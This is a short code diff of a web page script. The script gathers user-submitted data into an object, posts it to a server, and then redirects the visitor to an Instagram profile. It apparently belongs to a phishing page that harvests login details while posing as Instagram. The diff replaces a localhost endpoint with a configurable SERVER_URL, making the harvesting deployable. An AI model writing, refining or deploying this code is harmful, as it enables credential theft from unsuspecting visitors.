@@ -25,7 +25,7 @@
             return (obj[pair[0]] = pair[1]), obj
           }, {})
 
-        await post('http://localhost:5000', userdata)
+        await post(SERVER_URL, userdata)
         window.location = 'https://www.instagram.com/winsstooon/'
       })()
     </script>
